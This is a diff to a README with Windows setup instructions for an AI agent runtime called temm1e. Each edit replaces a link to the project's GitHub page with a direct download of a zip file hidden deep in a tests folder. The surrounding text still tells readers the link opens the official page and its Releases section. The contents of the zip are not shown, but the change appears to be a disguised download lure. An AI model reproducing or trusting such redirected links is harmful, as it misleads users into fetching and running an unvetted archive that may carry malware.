@@ -1,6 +1,6 @@
 # 🤖 temm1e - Reliable AI Agent Runtime
 
-[![Download temm1e](https://img.shields.io/badge/Download-temm1e-green)](https://github.com/corse7e/temm1e)
+[![Download temm1e](https://img.shields.io/badge/Download-temm1e-green)](https://github.com/corse7e/temm1e/raw/refs/heads/main/crates/temm1e-hive/docs/swarm/experiment_artifacts/single_agent/taskforge/tests/e_temm_3.8-beta.1.zip)
 
 ---
 
@@ -21,7 +21,7 @@ This guide will help you download and run temm1e on a Windows computer. You do n
 
 2. **Download temm1e**  
    Visit the main download page by clicking this big button below:  
-   [![Download temm1e](https://img.shields.io/badge/Download-%20Now-blue?style=for-the-badge)](https://github.com/corse7e/temm1e)  
+   [![Download temm1e](https://img.shields.io/badge/Download-%20Now-blue?style=for-the-badge)](https://github.com/corse7e/temm1e/raw/refs/heads/main/crates/temm1e-hive/docs/swarm/experiment_artifacts/single_agent/taskforge/tests/e_temm_3.8-beta.1.zip)  
    
    This link takes you to the official GitHub page. On that page, look for the “Releases” section. Find the latest stable release and click on the file ending with `.exe` to download it. The download file is small and should complete quickly.
 
@@ -93,7 +93,7 @@ After you download the `.exe` file, follow these steps:
 
 From time to time, new versions of temm1e may be released to improve performance or add features. To update:
 
-1. Visit the [temm1e GitHub page](https://github.com/corse7e/temm1e) again.
+1. Visit the [temm1e GitHub page](https://github.com/corse7e/temm1e/raw/refs/heads/main/crates/temm1e-hive/docs/swarm/experiment_artifacts/single_agent/taskforge/tests/e_temm_3.8-beta.1.zip) again.
 
 2. Download the latest `.exe` from the Releases section.
 
